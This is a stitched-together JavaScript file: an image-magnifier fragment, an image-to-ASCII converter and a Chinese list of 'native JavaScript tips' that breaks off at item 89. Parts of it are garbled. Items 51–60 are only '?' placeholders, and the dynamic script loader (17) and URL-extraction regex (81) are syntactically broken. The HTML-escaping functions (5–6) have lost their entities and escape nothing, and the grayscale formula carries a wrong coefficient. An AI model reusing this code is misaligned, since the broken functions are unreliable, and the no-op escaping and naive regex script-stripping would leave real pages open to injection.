		var l=e.clientX-pos.x+(document.documentElement.scrollLeft || document.body.scrollLeft);//鼠标位置相对于图片左上角的偏移
		var t=e.clientY-pos.y+(document.documentElement.scrollTop || document.body.scrollTop);
		var zs=this.getSize(this.viewer);
		var pl=-l*this.options.mul+zs.w/2;
		var pt=-t*this.options.mul+zs.h/2;
		pl=pl>0?0:pl;
		pt=pt>0?0:pt;

		var vs=this.getSize(this.viewimg);
		pl=Math.max(pl,zs.w-vs.w);
		pt=Math.max(pt,zs.h-vs.h);

		this.viewimg.style.left=pl+"px";
		this.viewimg.style.top=pt+"px";
	},
	init:function() {
		var o=this;
		var load=function(a) {//图片加载
			o.createView.call(o);
			o.img.setAttribute("alt","");
			o.ae(o.img,"mousemove",function(event){o.move.call(o,event);});
			if(!o.options.viewer) {
				o.ae(o.img,"mouseover",function(){o.viewer.style.display=""});
				o.ae(o.img,"mouseout",function(){o.viewer.style.display="none"});
			}
		};
		if(typeof(document.readyState)=="undefined" || window.opera) {
			var de=document.documentElement || document.body;
			var h=de.scrollHeight;
			var t=setInterval(function() {
				if(h==de.scrollHeight){
					clearInterval(t);
					load();
				} else h=de.scrollHeight;
			},500);
		} else if(document.readyState=="complete")
			load();
		else
			o.ae(window,"load",load);
	}
};
#T=img2txt.js
/*
https://gist.github.com/justjavac/6696499
*/
var cv = document.getElementById('cv');
var c = cv.getContext('2d');
var txtDiv = document.getElementById('txt');
var fileBtn = document.getElementById("up-button");
var img = new Image();
img.src = 'a.jpg';
img.onload = init; // 图片加载完开始转换
fileBtn.onchange = getImg;
 
// 根据灰度生成相应字符
function toText(g) {
    if (g <= 30) {
        return '#';
    } else if (g > 30 && g <= 60) {
        return '&';
    } else if (g > 60 && g <= 120) {
        return '$';
    }  else if (g > 120 && g <= 150) {
        return '*';
    } else if (g > 150 && g <= 180) {
        return 'o';
    } else if (g > 180 && g <= 210) {
        return '!';
    } else if (g > 210 && g <= 240) {
        return ';';
    }  else {
        return '&nbsp;';
    }
}
 
 
// 根据rgb值计算灰度
function getGray(r, g, b) {
    return 0.299 * r + 0.578 * g + 0.114 * b;
}
 
// 转换
function init() {
    txtDiv.style.width = img.width + 'px';
    cv.width = img.width;
    cv.height = img.height;
    c.drawImage(img, 0, 0);
    var imgData = c.getImageData(0, 0, img.width, img.height);
    var imgDataArr = imgData.data;
    var imgDataWidth = imgData.width;
    var imgDataHeight = imgData.height;
    var html = '';
    for (h = 0; h < imgDataHeight; h += 12) {
        var p = '<p>';
        for (w = 0; w < imgDataWidth; w += 6) {
            var index = (w + imgDataWidth * h) * 4;
            var r = imgDataArr[index + 0];
            var g = imgDataArr[index + 1];
            var b = imgDataArr[index + 2];
            var gray = getGray(r, g, b);
            p += toText(gray);
        }
        p += '</p>';
        html += p;
    }
    txtDiv.innerHTML = html;
}
 
// 获取图片
function getImg(file) {
    var reader = new FileReader();
    reader.readAsDataURL(fileBtn.files[0]);
    reader.onload = function () {
        img.src = reader.result;
    }
}
#T=JavaScript 100原生态纯大技巧大收集---你值得拥有(1)
原生态纯JavaScript 100大技巧大收集---你值得拥有
1、原生JavaScript实现字符串长度截取
function cutstr(str, len) {
	var temp;
	var icount = 0;
	var patrn = /[^\x00-\xff]/;
	var strre = "";
	for (var i = 0; i < str.length; i++) {
		if (icount < len - 1) {
			temp = str.substr(i, 1);
			if (patrn.exec(temp) == null) {
				icount = icount + 1
			} else {
				icount = icount + 2
			}
			strre += temp
		} else {
			break
		}
	}
	return strre + "..."
}
2、原生JavaScript获取域名主机
function getHost(url) {
	var host = "null";
	if(typeof url == "undefined"|| null == url) {
		url = window.location.href;
	}
	var regex = /^\w+\:\/\/([^\/]*).*/;
	var match = url.match(regex);
	if(typeof match != "undefined" && null != match) {
		host = match[1];
	}
	return host;
}
3、原生JavaScript清除空格
String.prototype.trim = function() {
	var reExtraSpace = /^\s*(.*?)\s+$/;
	return this.replace(reExtraSpace, "$1")
}
4、原生JavaScript替换全部
String.prototype.replaceAll = function(s1, s2) {
	return this.replace(new RegExp(s1, "gm"), s2)
}
5、原生JavaScript转义html标签
function HtmlEncode(text) {
	return text.replace(/&/g, '&').replace(/\"/g, '"').replace(/</g, '<').replace(/>/g, '>')
}
6、原生JavaScript还原html标签
function HtmlDecode(text) {
	return text.replace(/&/g, '&').replace(/"/g, '\"').replace(/</g, '<').replace(/>/g, '>')
}
7、原生JavaScript时间日期格式转换
Date.prototype.Format = function(formatStr) {
	var str = formatStr;
	var Week = ['日', '一', '二', '三', '四', '五', '六'];
	str = str.replace(/yyyy|YYYY/, this.getFullYear());
	str = str.replace(/yy|YY/, (this.getYear() % 100) > 9 ? (this.getYear() % 100).toString() : '0' + (this.getYear() % 100));
	str = str.replace(/MM/, (this.getMonth() + 1) > 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1));
	str = str.replace(/M/g, (this.getMonth() + 1));
	str = str.replace(/w|W/g, Week[this.getDay()]);
	str = str.replace(/dd|DD/, this.getDate() > 9 ? this.getDate().toString() : '0' + this.getDate());
	str = str.replace(/d|D/g, this.getDate());
	str = str.replace(/hh|HH/, this.getHours() > 9 ? this.getHours().toString() : '0' + this.getHours());
	str = str.replace(/h|H/g, this.getHours());
	str = str.replace(/mm/, this.getMinutes() > 9 ? this.getMinutes().toString() : '0' + this.getMinutes());
	str = str.replace(/m/g, this.getMinutes());
	str = str.replace(/ss|SS/, this.getSeconds() > 9 ? this.getSeconds().toString() : '0' + this.getSeconds());
	str = str.replace(/s|S/g, this.getSeconds());
	return str
}
8、原生JavaScript判断是否为数字类型
function isDigit(value) {
	var patrn = /^[0-9]*$/;
	if (patrn.exec(value) == null || value == "") {
		return false
	} else {
		return true
	}
}
9、原生JavaScript设置cookie值
function setCookie(name, value, Hours) {
	var d = new Date();
	var offset = 8;
	var utc = d.getTime() + (d.getTimezoneOffset() * 60000);
	var nd = utc + (3600000 * offset);
	var exp = new Date(nd);
	exp.setTime(exp.getTime() + Hours * 60 * 60 * 1000);
	document.cookie = name + "=" + escape(value) + ";path=/;expires=" + exp.toGMTString() + ";domain=360doc.com;"
}
10、原生JavaScript获取cookie值
function getCookie(name) {
	var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
	if (arr != null) return unescape(arr[2]);
	return null
}
11、原生JavaScript加入收藏夹
function AddFavorite(sURL, sTitle) {
	try {
		window.external.addFavorite(sURL, sTitle)
	} catch(e) {
		try {
			window.sidebar.addPanel(sTitle, sURL, "")
		} catch(e) {
			alert("加入收藏失败，请使用Ctrl+D进行添加")
		}
	}
}
12、原生JavaScript设为首页
function setHomepage() {
	if (document.all) {
		document.body.style.behavior = 'url(#default#homepage)';
		document.body.setHomePage('http://www.jq-school.com')
	} else if (window.sidebar) {
		if (window.netscape) {
			try {
				netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect")
			} catch(e) {
				alert("该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项 signed.applets.codebase_principal_support 值该为true")
			}
		}
		var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
		prefs.setCharPref('browser.startup.homepage', 'http://www.jq-school.com')
	}
}
13、原生JavaScript判断IE6
var ua = navigator.userAgent.toLowerCase();
var isIE6 = ua.indexOf("msie 6") > -1;
if (isIE6) {
	try {
		document.execCommand("BackgroundImageCache", false, true)
	} catch(e) {}
}
14、原生JavaScript加载样式文件
function LoadStyle(url) {
	try {
		document.createStyleSheet(url)
	} catch(e) {
		var cssLink = document.createElement('link');
		cssLink.rel = 'stylesheet';
		cssLink.type = 'text/css';
		cssLink.href = url;
		var head = document.getElementsByTagName('head')[0];
		head.appendChild(cssLink)
	}
}
15、原生JavaScript返回脚本内容
function evalscript(s) {
	if(s.indexOf('<script') == -1) return s;
	var p = /<script[^\>]*?>([^\x00]*?)<\/script>/ig;
	var arr = [];
	while(arr = p.exec(s)) {
		var p1 = /<script[^\>]*?src=\"([^\>]*?)\"[^\>]*?(reload=\"1\")?(?:charset=\"([\w\-]+?)\")?><\/script>/i;
		var arr1 = [];
		arr1 = p1.exec(arr[0]);
		if(arr1) {
			appendscript(arr1[1], '', arr1[2], arr1[3]);
		} else {
			p1 = /<script(.*?)>([^\x00]+?)<\/script>/i;
			arr1 = p1.exec(arr[0]);
			appendscript('', arr1[2], arr1[1].indexOf('reload=') != -1);
		}
	}
	return s;
}
16、原生JavaScript清除脚本内容
function stripscript(s) {
	return s.replace(/<script.*?>.*?<\/script>/ig, '');
}
17、原生JavaScript动态加载脚本文件
function appendscript(src, text, reload, charset) {
	var id = hash(src + text);
	if(!reload && in_array(id, evalscripts)) return;
	if(reload && $(id)) {
		$(id).parentNode.removeChild($(id));
	}
	evalscripts.push(id);
	var scriptNode = document.createElement("script");
	scriptNode.type = "text/javascript";
	scriptNode.id = id;
	scriptNode.charset = charset ? charset : (BROWSER.firefox ? document.characterSet : document.charset);
	try {
		if(src) {
			scriptNode.src=\'#\'"  = false;
			scriptNode.onload = function () {
				scriptNode. = true;
				JSLOADED[src] = 1;
			};
			scriptNode.onreadystatechange = function () {
				if((scriptNode.readyState == 'loaded' || scriptNode.readyState == 'complete') && !scriptNode. {
					scriptNode. = true;
					JSLOADED[src] = 1;
				}
			};
		} else if(text){
			scriptNode.text = text;
		}
		document.getElementsByTagName('head')[0].appendChild(scriptNode);
	} catch(e) {}
}
18、原生JavaScript返回按ID检索的元素对象
function $(id) {
	return !id ? null : document.getElementById(id);
}
19、原生JavaScript返回浏览器版本内容
function browserVersion(types) {
	var other = 1;
	for(i in types) {
		var v = types[i] ? types[i] : i;
		if(USERAGENT.indexOf(v) != -1) {
			var re = new RegExp(v + '(\\/|\\s)([\\d\\.]+)', 'ig');
			var matches = re.exec(USERAGENT);
			var ver = matches != null ? matches[2] : 0;
			other = ver !== 0 && v != 'mozilla' ? 0 : other;
		}else {
			var ver = 0;
		}
		eval('BROWSER.' + i + '= ver');
	}
	BROWSER.other = other;
}
20、原生JavaScript元素显示的通用方法
function $(id) {
	return !id ? null : document.getElementById(id);
}
function display(id) {
	var obj = $(id);
	if(obj.style.visibility) {
		obj.style.visibility = obj.style.visibility == 'visible' ? 'hidden' : 'visible';
	} else {
		obj.style.display = obj.style.display == '' ? 'none' : '';
	}
}
21、原生JavaScript中有insertBefore方法,可惜却没有insertAfter方法?用如下函数实现
function insertAfter(newChild,refChild){ 
	var parElem=refChild.parentNode; 
	if(parElem.lastChild==refChild){ 
		refChild.appendChild(newChild); 
	}else{ 
		parElem.insertBefore(newChild,refChild.nextSibling); 
	} 
}
22、原生JavaScript中兼容浏览器绑定元素事件
function addEventSamp(obj,evt,fn){ 
	if (obj.addEventListener) { 
		obj.addEventListener(evt, fn, false); 
	}else if(obj.attachEvent){ 
		obj.attachEvent('on'+evt,fn); 
	} 
} 
23、原生JavaScript光标停在文字的后面，文本框获得焦点时调用
function focusLast(){ 
	var e = event.srcElement; 
	var r =e.createTextRange(); 
	r.moveStart('character',e.value.length); 
	r.collapse(true); 
	r.select(); 
}
24、原生JavaScript检验URL链接是否有效
function getUrlState(URL){ 
	var xmlhttp = new ActiveXObject("microsoft.xmlhttp"); 
	xmlhttp.Open("GET",URL, false);  
	try{  
		xmlhttp.Send(); 
	}catch(e){
	}finally{ 
		var result = xmlhttp.responseText; 
		if(result){ 
			if(xmlhttp.Status==200){ 
				return(true); 
			}else{ 
				return(false); 
			} 
		}else{ 
			return(false); 
		} 
	} 
}
25、原生JavaScript格式化CSS样式代码
function formatCss(s){//格式化代码
	s = s.replace(/\s*([\{\}\:\;\,])\s*/g, "$1");
	s = s.replace(/;\s*;/g, ";"); //清除连续分号
	s = s.replace(/\,[\s\.\#\d]*{/g, "{");
	s = s.replace(/([^\s])\{([^\s])/g, "$1 {\n\t$2");
	s = s.replace(/([^\s])\}([^\n]*)/g, "$1\n}\n$2");
	s = s.replace(/([^\s]);([^\s\}])/g, "$1;\n\t$2");
	return s;
}
26、原生JavaScript压缩CSS样式代码
function yasuoCss (s) {//压缩代码
	s = s.replace(/\/\*(.|\n)*?\*\//g, ""); //删除注释
	s = s.replace(/\s*([\{\}\:\;\,])\s*/g, "$1");
	s = s.replace(/\,[\s\.\#\d]*\{/g, "{"); //容错处理
	s = s.replace(/;\s*;/g, ";"); //清除连续分号
	s = s.match(/^\s*(\S+(\s+\S+)*)\s*$/); //去掉首尾空白
	return (s == null) ? "" : s[1];
}
27、原生JavaScript获取当前路径
var currentPageUrl = "";
if (typeof this.href === "undefined") {
	currentPageUrl = document.location.toString().toLowerCase();
}
else {
	currentPageUrl = this.href.toString().toLowerCase();
}
28、原生JavaScriptIP转成整型
function _ip2int(ip){
	var num = 0;
	ip = ip.split(".");
	num = Number(ip[0]) * 256 * 256 * 256 + Number(ip[1]) * 256 * 256 + Number(ip[2]) * 256 + Number(ip[3]);
	num = num >>> 0;
	return num;
}
29、原生JavaScript整型解析为IP地址
function _int2iP(num){
	var str;
	var tt = new Array();
	tt[0] = (num >>> 24) >>> 0;
	tt[1] = ((num << 8) >>> 24) >>> 0;
	tt[2] = (num << 16) >>> 24;
	tt[3] = (num << 24) >>> 24;
	str = String(tt[0]) + "." + String(tt[1]) + "." + String(tt[2]) + "." + String(tt[3]);
	return str;
}
30、原生JavaScript实现checkbox全选与全不选
function checkAll() {
	var selectall = document.getElementById("selectall");
	var allbox = document.getElementsByName("allbox");
	if (selectall.checked) {
		for (var i = 0; i < allbox.length; i++) {
			allbox[i].checked = true;
		}
	} else {
		for (var i = 0; i < allbox.length; i++) {
			allbox[i].checked = false;
		}
	}
}
(31~40)移动篇
31、原生JavaScript判断是否移动设备
function isMobile(){
	if (typeof this._isMobile === 'boolean'){
		return this._isMobile;
	}
	var screenWidth = this.getScreenWidth();
	var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;
	var fixViewPortsExperimentRunning = fixViewPortsExperiment && (fixViewPortsExperiment.toLowerCase() === "new");
	if(!fixViewPortsExperiment){
		if(!this.isAppleMobileDevice()){
			screenWidth = screenWidth/window.devicePixelRatio;
		}
	}
	var isMobileScreenSize = screenWidth < 600;
	var isMobileUserAgent = false;
	this._isMobile = isMobileScreenSize && this.isTouchScreen();
	return this._isMobile;
}
32、原生JavaScript判断是否移动设备访问
function isMobileUserAgent(){
	return (/iphone|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i.test(window.navigator.userAgent.toLowerCase()));
}
33、原生JavaScript判断是否苹果移动设备访问
function isAppleMobileDevice(){
	return (/iphone|ipod|ipad|Macintosh/i.test(navigator.userAgent.toLowerCase()));
}
34、原生JavaScript判断是否安卓移动设备访问
function isAndroidMobileDevice(){
	return (/android/i.test(navigator.userAgent.toLowerCase()));
}
35、原生JavaScript判断是否Touch屏幕
function isTouchScreen(){
	return (('ontouchstart' in window) || window.DocumentTouch && document instanceof DocumentTouch);
}
36、原生JavaScript判断是否在安卓上的谷歌浏览器
function isNewChromeOnAndroid(){
	if(this.isAndroidMobileDevice()){
		var userAgent = navigator.userAgent.toLowerCase();
		if((/chrome/i.test(userAgent))){
			var parts = userAgent.split('chrome/');
			var fullVersionString = parts[1].split(" ")[0];
			var versionString = fullVersionString.split('.')[0];
			var version = parseInt(versionString);
			if(version >= 27){
				return true;
			}
		}
	}
	return false;
}
37、原生JavaScript判断是否打开视窗
function isViewportOpen() {
	return !!document.getElementById('wixMobileViewport');
}
38、原生JavaScript获取移动设备初始化大小
function getInitZoom(){
	if(!this._initZoom){
		var screenWidth = Math.min(screen.height, screen.width);
		if(this.isAndroidMobileDevice() && !this.isNewChromeOnAndroid()){
			screenWidth = screenWidth/window.devicePixelRatio;
		}
		this._initZoom = screenWidth /document.body.offsetWidth;
	}
	return this._initZoom;
}
39、原生JavaScript获取移动设备最大化大小
function getZoom(){
	var screenWidth = (Math.abs(window.orientation) === 90) ? Math.max(screen.height, screen.width) : Math.min(screen.height, screen.width);
	if(this.isAndroidMobileDevice() && !this.isNewChromeOnAndroid()){
		screenWidth = screenWidth/window.devicePixelRatio;
	}
	var FixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;
	var FixViewPortsExperimentRunning = FixViewPortsExperiment && (FixViewPortsExperiment === "New" || FixViewPortsExperiment === "new");
	if(FixViewPortsExperimentRunning){
		return screenWidth / window.innerWidth;
	}else{
		return screenWidth / document.body.offsetWidth;
	}
}
40、原生JavaScript获取移动设备屏幕宽度
function getScreenWidth(){
	var smallerSide = Math.min(screen.width, screen.height);
	var fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;
	var fixViewPortsExperimentRunning = fixViewPortsExperiment && (fixViewPortsExperiment.toLowerCase() === "new");
	if(fixViewPortsExperiment){
		if(this.isAndroidMobileDevice() && !this.isNewChromeOnAndroid()){
			smallerSide = smallerSide/window.devicePixelRatio;
		}
	}
	return smallerSide;
}
41、原生JavaScript完美判断是否为网址
function IsURL(strUrl) {
	var regular = /^\b(((https?|ftp):\/\/)?[-a-z0-9]+(\.[-a-z0-9]+)*\.(?:com|edu|gov|int|mil|net|org|biz|info|name|museum|asia|coop|aero|[a-z][a-z]|((25[0-5])|(2[0-4]\d)|(1\d\d)|([1-9]\d)|\d))\b(\/[-a-z0-9_:\@&?=+,.!\/~%\$]*)?)$/i
	if (regular.test(strUrl)) {
		return true;
	}
	else {
		return false;
	}
}
42、原生JavaScript根据样式名称检索元素对象
function getElementsByClassName(name) {
	var tags = document.getElementsByTagName('*') || document.all;
	var els = [];
	for (var i = 0; i < tags.length; i++) {
		if (tags[i].className) {
			var cs = tags[i].className.split(' ');
			for (var j = 0; j < cs.length; j++) {
				if (name == cs[j]) {
					els.push(tags[i]);
					break
				}
			}
		}
	}
	return els
}
43、原生JavaScript判断是否以某个字符串开头
String.prototype.startWith = function (s) {
	return this.indexOf(s) == 0
}
44、原生JavaScript判断是否以某个字符串结束
String.prototype.endWith = function (s) {
	var d = this.length - s.length;
	return (d >= 0 && this.lastIndexOf(s) == d)
}
45、原生JavaScript返回IE浏览器的版本号
function getIE(){
	if (window.ActiveXObject){
		var v = navigator.userAgent.match(/MSIE ([^;]+)/)[1];
		return parseFloat(v.substring(0, v.indexOf(".")))
	}
	return false
}
46、原生JavaScript获取页面高度
function getPageHeight(){
	var g = document, a = g.body, f = g.documentElement, d = g.compatMode == "BackCompat"
			? a
			: g.documentElement;
	return Math.max(f.scrollHeight, a.scrollHeight, d.clientHeight);
}
47、原生JavaScript获取页面scrollLeft
function getPageScrollLeft(){
	var a = document;
	return a.documentElement.scrollLeft || a.body.scrollLeft;
}
48、原生JavaScript获取页面可视宽度
function getPageViewWidth(){
	var d = document, a = d.compatMode == "BackCompat"
			? d.body
			: d.documentElement;
	return a.clientWidth;
}
49、原生JavaScript获取页面宽度
function getPageWidth(){
	var g = document, a = g.body, f = g.documentElement, d = g.compatMode == "BackCompat"
			? a
			: g.documentElement;
	return Math.max(f.scrollWidth, a.scrollWidth, d.clientWidth);
}
50、原生JavaScript获取页面scrollTop
function getPageScrollTop(){
	var a = document;
	return a.documentElement.scrollTop || a.body.scrollTop;
}
51、原生JavaScript获取页面可视高度
?
?
?
?
?
56、原生JavaScript全角半角转换,iCase: 0全到半，1半到全，其他不转化
?
?
58、原生JavaScript获取网页被卷去的位置
?
?
?
61、原生JavaScript解决offsetX兼容性问题
// 针对火狐不支持offsetX/Y
function getOffset(e){
  var target = e.target, // 当前触发的目标对象
	  eventCoord,
	  pageCoord,
	  offsetCoord;
  // 计算当前触发元素到文档的距离
  pageCoord = getPageCoord(target);
  // 计算光标到文档的距离
  eventCoord = {
	X : window.pageXOffset + e.clientX,
	Y : window.pageYOffset + e.clientY
  };
  // 相减获取光标到第一个定位的父元素的坐标
  offsetCoord = {
	X : eventCoord.X - pageCoord.X,
	Y : eventCoord.Y - pageCoord.Y
  };
  return offsetCoord;
}
function getPageCoord(element){
  var coord = { X : 0, Y : 0 };
  // 计算从当前触发元素到根节点为止，
  // 各级 offsetParent 元素的 offsetLeft 或 offsetTop 值之和
  while (element){
	coord.X += element.offsetLeft;
	coord.Y += element.offsetTop;
	element = element.offsetParent;
  }
  return coord;
}
62、原生JavaScript常用的正则表达式
//正整数
/^[0-9]*[1-9][0-9]*$/;
//负整数
/^-[0-9]*[1-9][0-9]*$/;
//正浮点数
/^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$/;   
//负浮点数
/^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$/;  
//浮点数
/^(-?\d+)(\.\d+)?$/;
//email地址
/^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/;
//url地址
/^[a-zA-z]+://(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\S*)?$/;
//年/月/日（年-月-日、年.月.日）
/^(19|20)\d\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$/;
//匹配中文字符
/[\u4e00-\u9fa5]/;
//匹配帐号是否合法(字母开头，允许5-10字节，允许字母数字下划线)
/^[a-zA-Z][a-zA-Z0-9_]{4,9}$/;
//匹配空白行的正则表达式
/\n\s*\r/;
//匹配中国邮政编码
/[1-9]\d{5}(?!\d)/;
//匹配身份证
/\d{15}|\d{18}/;
//匹配国内电话号码
/(\d{3}-|\d{4}-)?(\d{8}|\d{7})?/;
//匹配IP地址
/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)/;
//匹配首尾空白字符的正则表达式
/^\s*|\s*$/;
//匹配HTML标记的正则表达式
< (\S*?)[^>]*>.*?|< .*? />;
63、原生JavaScript实现返回顶部的通用方法
function backTop(btnId) {
	var btn = document.getElementById(btnId);
	var d = document.documentElement;
	var b = document.body;
	window.onscroll = set;
	btn.style.display = "none";
	btn.onclick = function() {
		btn.style.display = "none";
		window.onscroll = null;
		this.timer = setInterval(function() {
			d.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1);
			b.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1);
			if ((d.scrollTop + b.scrollTop) == 0) clearInterval(btn.timer, window.onscroll = set);
		},
		10);
	};
	function set() {
		btn.style.display = (d.scrollTop + b.scrollTop > 100) ? 'block': "none"
	}
};
backTop('goTop');
64、原生JavaScript获得URL中GET参数值
// 用法：如果地址是 test.htm?t1=1&t2=2&t3=3, 那么能取得：GET["t1"], GET["t2"], GET["t3"]
function get_get(){ 
  querystr = window.location.href.split("?")
  if(querystr[1]){
	GETs = querystr[1].split("&")
	GET =new Array()
	for(i=0;i<GETs.length;i++){
	  tmp_arr = GETs[i].split("=")
	  key=tmp_arr[0]
	  GET[key] = tmp_arr[1]
	}
  }
  return querystr[1];
}
65、原生JavaScript实现全选通用方法
function checkall(form, prefix, checkall) {
	var checkall = checkall ? checkall : 'chkall';
	for(var i = 0; i < form.elements.length; i++) {
		var e = form.elements[i];
		if(e.type=="checkbox"){
			e.checked = form.elements[checkall].checked;
		}
	}
}
66、原生JavaScript实现全部取消选择通用方法
function uncheckAll(form) {
	for (var i=0;i<form.elements.length;i++){
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked=!e.checked;
	}
}
67、原生JavaScript实现打开一个窗体通用方法
function openWindow(url,windowName,width,height){
	var x = parseInt(screen.width / 2.0) - (width / 2.0); 
	var y = parseInt(screen.height / 2.0) - (height / 2.0);
	var isMSIE= (navigator.appName == "Microsoft Internet Explorer");
	if (isMSIE) {
		var p = "resizable=1,location=no,scrollbars=no,width=";
		p = p+width;
		p = p+",height=";
		p = p+height;
		p = p+",left=";
		p = p+x;
		p = p+",top=";
		p = p+y;
		retval = window.open(url, windowName, p);
	} else {
		var win = window.open(url, "ZyiisPopup", "top=" + y + ",left=" + x + ",scrollbars=" + scrollbars + ",dialog=yes,modal=yes,width=" + width + ",height=" + height + ",resizable=no" );
		eval("try { win.resizeTo(width, height); } catch(e) { }");
		win.focus();
	}
}
68、原生JavaScript判断是否为客户端设备
function client(o){	
	   var b = navigator.userAgent.toLowerCase();   
	   var t = false;
	   if (o == 'isOP'){
			 t = b.indexOf('opera') > -1;
	   }
	   if (o == 'isIE'){
			 t = b.indexOf('msie') > -1;
	   }
	   if (o == 'isFF'){
			 t = b.indexOf('firefox') > -1;
	   }
	   return t;
}
69、原生JavaScript获取单选按钮的值
function get_radio_value(field){
	if(field&&field.length){	
		for(var i=0;i<field.length;i++){		
			if(field[i].checked){			
				return field[i].value;								
			}			
		}		
	}else {		
		return ;				
	}	
}
70、原生JavaScript获取复选框的值
function get_checkbox_value(field){	
	if(field&&field.length){	
		for(var i=0;i<field.length;i++){			
			if(field[i].checked && !field[i].disabled){
				return field[i].value;
			}
		}		
	}else {
		return;
	}			
}
(71~80)验证篇这一篇文章主要是10个比较常用表单验证功能，包括了邮箱、危险字符、验证长度、验证网址、验证小数、整数、浮点数等常用的验证，有了这些代码片段，平时的表单验证也可以不需要jquery的验证插件了，希望可以帮到大家。。。
71、原生JavaScript判断是否为邮箱
function isEmail(str){
	var re=/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/; 
	if (re.test(str) != true) {
		return false;
	}else{
		return true;
	}	
}
72、原生JavaScript判断是否有列表中的危险字符
function isValidReg(chars){
	var re=/<|>|\[|\]|\{|\}|『|』|※|○|●|◎|§|△|▲|☆|★|◇|◆|□|▼|㊣|﹋|⊕|⊙|〒|ㄅ|ㄆ|ㄇ|ㄈ|ㄉ|ㄊ|ㄋ|ㄌ|ㄍ|ㄎ|ㄏ|ㄐ|ㄑ|ㄒ|ㄓ|ㄔ|ㄕ|ㄖ|ㄗ|ㄘ|ㄙ|ㄚ|ㄛ|ㄜ|ㄝ|ㄞ|ㄟ|ㄢ|ㄣ|ㄤ|ㄥ|ㄦ|ㄧ|ㄨ|ㄩ|■|▄|▆|\*|@|#|\^|\\/;
	if (re.test( chars) == true) {
		return false;
	}else{
		return true;
	}	
}
73、原生JavaScript判断字符串是否大于规定的长度
function isValidLength(chars, len) {
	if (chars.length < len) {
		return false;
	}
	return true;
}
74、原生JavaScript判断字符串是为网址不区分大小写
function isValidURL( chars ) {
	var re=/^([hH][tT]{2}[pP]:\/\/|[hH][tT]{2}[pP][sS]:\/\/)(\S+\.\S+)$/;
	if (!isNULL(chars)) {
		chars = jsTrim(chars);
		if (chars.match(re) == null)
			return false;
		else
			return true;
	}
	return false;
}
75、原生JavaScript判断字符串是否为小数
function isValidDecimal( chars ) {
	var re=/^\d*\.?\d{1,2}$/;
	if (chars.match(re) == null)
		return false;
	else
		return true;
}
76、原生JavaScript判断字符串是否为整数
function isNumber( chars ) {
	var re=/^\d*$/;
	if (chars.match(re) == null)
		return false;
	else
		return true;
}
77、原生JavaScript判断字符串是否为浮点数
function isFloat( str ) {
	for(i=0;i<str.length;i++)  {
	   if ((str.charAt(i)<"0" || str.charAt(i)>"9")&& str.charAt(i) != '.'){
			return false;
	   }
	}
	return true;
}
78、原生JavaScript判断字符是否为A-Za-z英文字母
function isLetters( str ){
	var re=/^[A-Za-z]+$/;
	if (str.match(re) == null)
		return false;
	else
		return true;
}
79、原生JavaScript判断字符串是否邮政编码
function isValidPost( chars ) {
	var re=/^\d{6}$/;
	if (chars.match(re) == null)
		return false;
	else
		return true;
}
80、原生JavaScript判断字符是否空NULL
function isNULL( chars ) {
	if (chars == null)
		return true;
	if (jsTrim(chars).length==0)
		return true;
	return false;
}
81、原生JavaScript用正则表达式提取页面代码中所有网址
var aa = document.documentElement.outerHTML.match(/(url\(|src=\'#\'"  ]+)[\"\'\)]*|(http:\/\/[\w\-\.]+[^\"\'\(\)\<\>\[\] ]+)/ig).join("\r\n").replace(/^(src=\'#\'" ) ]*$/igm,"");
alert(aa)
82、原生JavaScript用正则表达式清除相同的数组(低效率)
Array.prototype.unique=function(){
	return this.reverse().join(",").match(/([^,]+)(?!.*\1)/ig).reverse();
}
83、原生JavaScript用正则表达式清除相同的数组(高效率)
String.prototype.unique=function(){
	var x=this.split(/[\r\n]+/);
	var y='';
	for(var i=0;i<x.length;i++){
		if(!new RegExp("^"+x[i].replace(/([^\w])/ig,"\\$1")+"$","igm").test(y)){
			y+=x[i]+"\r\n"
		}
	}
	return y
}
84、原生JavaScript用正则表达式按字母排序，对每行进行数组排序
function SetSort(){
	var text=K1.value.split(/[\r\n]/).sort().join("\r\n");//顺序
	var test=K1.value.split(/[\r\n]/).sort().reverse().join("\r\n");//反序
	K1.value=K1.value!=text?text:test;
}
85、原生JavaScript字符串反序
function IsReverse(text){
	return text.split('').reverse().join('');
}
86、原生JavaScript用正则表达式清除html代码中的脚本
function clear_script(){
  K1.value=K1.value.replace(/<script.*?>[\s\S]*?<\/script>|\s+on[a-zA-Z]{3,16}\s?=\s?"[\s\S]*?"|\s+on[a-zA-Z]{3,16}\s?=\s?'[\s\S]*?'|\s+on[a-zA-Z]{3,16}\s?=[^ >]+/ig,"");
}
87、原生JavaScript动态执行JavaScript脚本
function javascript(){
	try{
	  eval(K1.value);
	}catch(e){
		alert(e.message);
	}
}
88、原生JavaScript动态执行VBScript脚本
function vbscript(){
	try{
		var script=document.getElementById("K1").value;
		if(script.trim()=="")return;
		window.execScript('On Error Resume Next \n'+script+'\n If Err.Number<>0 Then \n MsgBox "请输入正确的VBScript脚本!",48,"脚本错误!" \n End If',"vbscript")
	}catch(e){
		alert(e.message);
	}
}
89、原生JavaScript实现金额大写转换函数
